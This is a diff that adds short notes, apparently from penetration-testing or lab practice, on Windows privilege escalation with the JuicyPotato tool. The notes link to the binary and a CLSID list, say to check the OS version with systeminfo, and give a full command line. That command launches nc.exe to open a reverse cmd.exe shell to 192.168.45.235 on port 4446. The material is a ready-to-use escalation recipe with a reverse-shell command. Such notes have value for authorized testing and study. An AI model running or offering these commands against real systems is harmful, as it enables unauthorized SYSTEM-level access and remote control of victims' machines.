@@ -1,0 +1,18 @@
+We can use the following link to get a x86 executable of JuicyPotato.
+
+- https://github.com/ivanitlearning/Juicy-Potato-x86/releases
+
+Then, to get the BITS CSLIDs we use the following link: 
+
+- https://github.com/ohpe/juicy-potato/tree/master/CLSID/
+
+
+In order to retrieve the correct BITS, we need to know the version of the OS, that we can catch with 'systeminfo'.
+
+Once we have gather the binary and the BITS CSLIDs list, we try with the following command:
+
+- juicy.potato.x86.exe -l 1337 -p <COMMAND> -t * -c <BITS CSLIDs>
+
+For example:
+
+juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.235 4446" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
